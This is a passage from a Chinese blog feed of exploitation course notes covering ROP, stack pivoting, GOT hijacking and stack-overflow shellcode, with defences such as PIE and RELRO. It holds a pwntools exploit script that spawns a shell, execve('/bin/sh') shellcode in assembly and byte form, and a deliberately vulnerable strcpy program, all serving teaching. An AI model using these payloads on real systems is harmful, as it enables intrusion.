Payload，参数会产生重叠</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164655.png" alt></p><p>使用<code>pop ret</code>这类的ROP Gadget可以解决这个问题，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ebx ; pop esi ; pop edi ; ret ;</span><br></pre></td></tr></table></figure><p>这种三个的gadget下文记为<strong>pop3 ret</strong></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164912.png" alt></p><h4 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426165102.png" alt></p><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><ul><li>定义<ul><li>通过一个修改esp寄存器的gadget来改变栈的位置</li></ul></li><li>应用场景<ul><li>溢出长度较短，不够做ROP（例1）</li><li>溢出载荷以0结尾，而gadget地址为0开头（例2）</li><li>在泄露地址后，我们需要执行一个新的ROP链</li></ul></li></ul><p>例1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vodi <span class="title">stack_overflow</span><span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> dst[<span class="number">512</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(user)&gt;<span class="number">536</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">//536-512 = 24 字节的溢出，太短！</span></span><br><span class="line">    <span class="built_in">strcpy</span>(dst,user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vodi <span class="title">stack_overflow</span><span class="params">(<span class="keyword">char</span> *user)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dst[<span class="number">512</span>]</span><br><span class="line">    <span class="built_in">strcpy</span>(dst,user);</span><br><span class="line">&#125;</span><br><span class="line">x64 assembly</span><br><span class="line"><span class="number">0x406113</span>:<span class="number">55</span>push%rbp</span><br><span class="line"><span class="number">0x406114</span>:<span class="number">41</span> <span class="number">89</span> d4mov%edx,%e12d</span><br></pre></td></tr></table></figure><h3 id="add-esp"><a href="#add-esp" class="headerlink" title="add esp"></a>add esp</h3><p>将esp加上一个固定值的gadget我们称为“add esp”，例如：add esp，0x6c;ret;</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426112159.png" alt></p><h3 id="pop-ebp-ret-leave-ret"><a href="#pop-ebp-ret-leave-ret" class="headerlink" title="pop ebp ret + leave ret"></a>pop ebp ret + leave ret</h3><ul><li><code>pop ebp;ret;</code> + <code>leavel;ret;</code>两个gadget组合可以将esp改成任意值</li><li><code>pop ebp;ret;</code>可以将ebp改为任意值</li><li><code>leave = mov esp,ebp;pop ebp</code>因此ebp会存入esp，esp可以任意控制</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>第一次ROP，泄露libc地址<ul><li>调用<code>write(1,write_got,4)</code>，泄露write函数地址，同方法1</li><li>调用read(0,new_stack,ROP_len)，读取第二次ROP Payload到BSS段（新的栈）</li><li>利用栈迁移<code>pop ebp ret</code>+<code>leave ret</code>，连接执行第二次ROP</li><li>等待栈迁移触发第二次ROP执行，启动shell    </li></ul></li></ul><h2 id="GOT表劫持"><a href="#GOT表劫持" class="headerlink" title="GOT表劫持"></a>GOT表劫持</h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426135345.png" alt></p><ul><li>上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？</li><li>在ROP中通过Return To PLT调用read和write，实际上可以实现内存任意读写</li><li>因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改wrtie函数的GOT表项，然后再次调用write，实际上此时调用的则是GOT表项被劫持后的值，例如system()</li></ul><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426141137.png" alt></p><h4 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h4><ul><li>使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入<ul><li>调用write(1,write_got,4)，泄露write函数地址</li><li>调用read()，修改write()函数的GOT表项为system地址</li><li>调用read(0,bss,len(cmd))，将命令字符串(“/bin/sh”)写入.bss Section</li><li>调用write(cmd)，实际上调用的system(cmd)</li></ul></li><li>读取泄露的write函数地址，计算system()地址</li><li>输入system()地址，修改write()函数的GOT表项</li><li>输入命令字符串”/bin/sh”，写入.bss Section</li><li>调用write(cmd)来运行system(cmd)</li></ul><h2 id="如果题目没有给予libc怎么办"><a href="#如果题目没有给予libc怎么办" class="headerlink" title="如果题目没有给予libc怎么办"></a>如果题目没有给予libc怎么办</h2><ul><li><p>从寻找我们需要的<a href="gttps://libc.blukat.me/" target="_blank" rel="noopener">libc_base</a></p></li><li><p>使用DynELF</p></li></ul><h4 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h4><ul><li>原理：如果可以实现任意内存读，可以模拟<code>_dll_runtime_resolve</code>函数的行为来解析符号，这样的好处是无需知道libc。pwntools库中的DynELF模块已经实现了此功能</li><li>编写一个通用的任意内存泄露函数<ul><li>通过返回main()函数来允许内存泄露触发多次</li></ul></li><li>将泄露函数传入DynELF来解析system()函数的地址</li><li>通过ROP来调用system(“/bin/sh”)</li><li>当目标的libc库未知时，DynELF非常有用</li></ul><p>DEMO展示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,endian=<span class="string">'little'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">main = <span class="number">0x80481D</span></span><br><span class="line">bss = <span class="number">0x8049700</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line">p = process(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] PID: %s"</span> % proc.pidof(p)</span><br><span class="line">log.info(<span class="string">"[+] system: %s"</span> % hex(system))</span><br><span class="line"><span class="comment">#将栈溢出封装成ROP调用，方便多次触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rop</span><span class="params">(rop)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload)</span><br><span class="line"><span class="comment">#任意内存读函数，通过ROP调用write函数将任意地址内存读出，最后回到main，实现反复触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peek</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    rop = p32(elf.plt[<span class="string">'write'</span>]) + p32(main) + p32(<span class="number">1</span>) + p32(add) + p32(<span class="number">4</span>)</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#任意内存写函数，通过ROP调用write函数将任意地址内存写入，最后回到main，实现反复触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poke</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    rop = p32(elf.plt[<span class="string">'read'</span>]) + p32(main) + p32(<span class="number">0</span>) + p32(add) + p32(len(data))</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.send(data)</span><br><span class="line"><span class="comment">#将任意内存泄露函数peek传入DynELF</span></span><br><span class="line">d = DynELF(peek,elf=elf)</span><br><span class="line"><span class="comment">#DynELF模块可以实现任意库中的任意符号解析，例如system</span></span><br><span class="line">system = d.lookup(<span class="string">"system"</span>,<span class="string">"libc.so"</span>)</span><br><span class="line">log.info(<span class="string">"[+] system: %s"</span> % hex(system))</span><br><span class="line"><span class="comment">#将要执行的命令写入.bss Section</span></span><br><span class="line">poke(bss,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"><span class="comment">#通过ROP运行system(cmd)</span></span><br><span class="line">do_rop(p32(system) + p32(<span class="number">0xDEADBEEF</span>) + p32(bss))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="x64架构下的ROP"><a href="#x64架构下的ROP" class="headerlink" title="x64架构下的ROP"></a>x64架构下的ROP</h2><ul><li>amd64（64位）cdecl调用约定<ul><li>使用寄存器rdi、rsi、rdx、rcx、r8、r9来传递前6个参数</li><li>第七个及以上的参数通过栈来传递</li></ul></li><li>参数在寄存器中，必须用gadget来设置参数<ul><li>pop rdi ; ret </li><li>pop rsi ; pop r15 ; ret ;</li><li>用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget</li></ul></li></ul><h4 id="x64下通用Gadget"><a href="#x64下通用Gadget" class="headerlink" title="x64下通用Gadget"></a>x64下通用Gadget</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="keyword">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>几乎所有的x64 ELF在_libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13、r14、r15，再通过一个Gadget将这三个值分别送入rdx、rsi、edi中，正好涵盖了x64 cdecl调用约定下的前三个参数</p><h2 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h2><p>通过OneGadget工具进行查找：<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p><p>通常执行system(“/bin/sh”)需要在调用system之前传递参数；</p><p>比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell；</p><p>通常通过寻找字符串”/bin/sh”的引用来寻找（对着/bin/sh的地址在IDA Pro中按X）</p><h2 id="如何防御ROP"><a href="#如何防御ROP" class="headerlink" title="如何防御ROP"></a>如何防御ROP</h2><ul><li>位置无关代码（PIE）可防御攻击者直接ROP<ul><li>攻击者不知道代码地址</li><li>ROP与return to PLT技术无法直接使用</li></ul></li><li>PIE绕过方法<ul><li>结合信息泄露漏洞</li><li>x86_32架构下可爆破<ul><li>内存地址随机化粒度以页为单位：0x1000字节对齐</li></ul></li></ul></li></ul><h2 id="如何防御GOT表劫持"><a href="#如何防御GOT表劫持" class="headerlink" title="如何防御GOT表劫持"></a>如何防御GOT表劫持</h2><ul><li>重定位只读(Relocation Read Only)缓解措施<ul><li>编译选项：gcc -z , relro</li><li>在进入main()之前，所有的外部函数都会被解析</li><li>所有GOT表设置为只读</li><li>绕过方法<ul><li>劫持为开启该保护的动态库中的GOT表(例如libc中的GOT表)</li><li>改写函数返回地址或函数指针</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 长亭PWN笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>长亭PWN笔记01</title>
      <link href="/2020/04/26/%E2%94%82%C3%B1%E2%95%90%C3%B1PWN%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F01/"/>
      <url>/2020/04/26/%E2%94%82%C3%B1%E2%95%90%C3%B1PWN%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F01/</url>
      
        <content type="html"><![CDATA[<h2 id="PWN工具集合"><a href="#PWN工具集合" class="headerlink" title="PWN工具集合"></a>PWN工具集合</h2><ul><li>zio - 框架<ul><li>接口简单易用</li><li><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></li></ul></li><li>Pwntools<ul><li>Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等</li><li><a href="http://pwntools.com/" target="_blank" rel="noopener">http://pwntools.com/</a></li><li><a href="https://github.com/gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/gallopsled/pwntools</a></li></ul></li><li>peda/pwndbg - gdb调试插件</li><li>libheap</li></ul><h2 id="利用栈溢出"><a href="#利用栈溢出" class="headerlink" title="利用栈溢出"></a>利用栈溢出</h2><h3 id="Example-BOE-program："><a href="#Example-BOE-program：" class="headerlink" title="Example BOE program："></a>Example BOE program：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (argc&lt;<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"argv[1]:%s\n"</span>,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>作为第一个漏洞利用的案例，我们不开启栈不可执行和栈canary的保护选项</p></li><li><p>argc即命令行参数个数</p></li><li><p>argv[0]即程序名字符串本身，argv[1]是第一个参数，以此类推</p></li></ol></blockquote><p>编译命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector bof.c -o bof -m32</span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序接收命令行输入第一个参数，如果这个参数过长，strcpy时会溢出栈上缓冲区buf</p><table><thead><tr><th align="center">高地址</th><th align="center">char **argv</th></tr></thead><tbody><tr><td align="center"></td><td align="center">int argc</td></tr><tr><td align="center"></td><td align="center">return address</td></tr><tr><td align="center"></td><td align="center">saved %ebp</td></tr><tr><td align="center">低地址</td><td align="center">char buf[128]</td></tr></tbody></table><ul><li>栈在内存中是从高地址到低地址增长</li><li>局部变量char是从低地址到高地址增长</li></ul><p>当字符串参数过长就会出现：</p><table><thead><tr><th align="center">高地址</th><th align="center">char **argv</th></tr></thead><tbody><tr><td align="center"></td><td align="center">int argc</td></tr><tr><td align="center"></td><td align="center">buf[132~135]</td></tr><tr><td align="center"></td><td align="center">buf[128~131]</td></tr><tr><td align="center">低地址</td><td align="center">buf[0~127]</td></tr></tbody></table><p>可以把Shellcode放在返回地址之后，然后通过覆盖返回地址跳转至Shellcode</p><table><thead><tr><th align="center">高地址</th><th align="center">Shellcode</th></tr></thead><tbody><tr><td align="center"></td><td align="center">Shellcode</td></tr><tr><td align="center"></td><td align="center">Shellcode addr</td></tr><tr><td align="center"></td><td align="center">buf[128~131]</td></tr><tr><td align="center">低地址</td><td align="center">buf[0~127]</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : padding1 + address of shellcode + shellcode</span><br></pre></td></tr></table></figure><p>有一种手法可以把return address覆盖为<code>jmp esp</code>的地址，这样就不用管具体Shellcode addr的具体地址了，只要shellcode跟在<code>jmp esp</code>指令后面即可</p><table><thead><tr><th align="center">高地址</th><th align="center">Shellcode</th><th align="center"></th></tr></thead><tbody><tr><td align="center"></td><td align="center">Shellcode</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">Shellcode addr</td><td align="center">jmp esp</td></tr><tr><td align="center"></td><td align="center">buf[128~131]</td><td align="center"></td></tr><tr><td align="center">低地址</td><td align="center">buf[0~127]</td><td align="center"></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : padding1 + address of jmp esp + shellcode</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>首先查看一下execve函数的原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">char</span> *<span class="keyword">const</span> argv[],cahr *<span class="keyword">const</span> envp[])</span></span></span><br></pre></td></tr></table></figure><p>手写64位下的shellcode代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor %eax,%eax</span><br><span class="line">pushl %eax</span><br><span class="line">push $0x68732f2f</span><br><span class="line">push $0x6e69622f</span><br><span class="line">movl %esp,%ebx</span><br><span class="line">pushl %eax</span><br><span class="line">pushl %ebx</span><br><span class="line">movl %esp,%ecx</span><br><span class="line">cltd</span><br><span class="line">movb $0xb,%al</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure><blockquote><p>此处eax为0，因此cltd相当于将edx也设为0</p></blockquote><p>以上代码实现的效果就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,null,null)</span><br></pre></td></tr></table></figure><p>Syscall 调用约定</p><ul><li>syscall number: %eax=0xb</li><li>第一个参数：%ebx=filename</li><li>第二个参数：%ecx=argv</li><li>第三个参数：%edx=envp=0</li><li>第四个参数：%esi</li><li>第五个参数：%edi</li><li>第六个参数：%ebp</li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>用内联（inline）汇编测试编写的shellcode，也可以使用汇编器as直接编译汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _asm_(</span><br><span class="line">    <span class="string">"xor %eax,%eax\n\t"</span></span><br><span class="line">    <span class="string">"pushl %eax\n\t"</span></span><br><span class="line">    <span class="string">"push $0x68732f2f\n\t"</span></span><br><span class="line">    <span class="string">"push $0x6e69622f\n\t"</span></span><br><span class="line">    <span class="string">"movl %esp,%ebx\n\t"</span></span><br><span class="line">    <span class="string">"pushl %eax\n\t"</span></span><br><span class="line">    <span class="string">"pushl %ebx\n\t"</span></span><br><span class="line">    <span class="string">"movl %esp,%ecx\n\t"</span>  </span><br><span class="line">    <span class="string">"cltd\n\t"</span></span><br><span class="line">    <span class="string">"movb $0xb,%al\n\t"</span></span><br><span class="line">    <span class="string">"int $0x80\n\t"</span>      </span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><p>提取测试代码反汇编出来的机器码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d shellcode</span><br></pre></td></tr></table></figure><p>提取得到shellcode的指令的机器码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE = &quot;</span><br><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure><p>所以上述代码还可以改写为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b \xcd\x80"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>(*f)()=(<span class="keyword">void</span>(*)())shellcode;</span><br><span class="line">    f();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>段代码中，shellcode存储在全局字符数组中，属于.data section,编译器默认其不可执行，必须加上选项-z execstack,即开启栈/堆/数据段可执行</p><h2 id="栈溢出漏洞利用步骤"><a href="#栈溢出漏洞利用步骤" class="headerlink" title="栈溢出漏洞利用步骤"></a>栈溢出漏洞利用步骤</h2><ol><li>找到能够刚好覆盖返回地址的缓冲区长度</li><li>填充Shellcode并找到Shellcode所在地址</li><li>将返回地址覆盖为Shellcode地址</li></ol><h2 id="寻找填充长度"><a href="#寻找填充长度" class="headerlink" title="寻找填充长度"></a>寻找填充长度</h2><h3 id="手动寻找"><a href="#手动寻找" class="headerlink" title="手动寻找"></a>手动寻找</h3><p>为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时esp指向的即是返回地址所在位置。</p><p>现在依然以上文的示例程序为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/test$ gdb -q --args bof AAAA</span><br><span class="line">pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from bof...(no 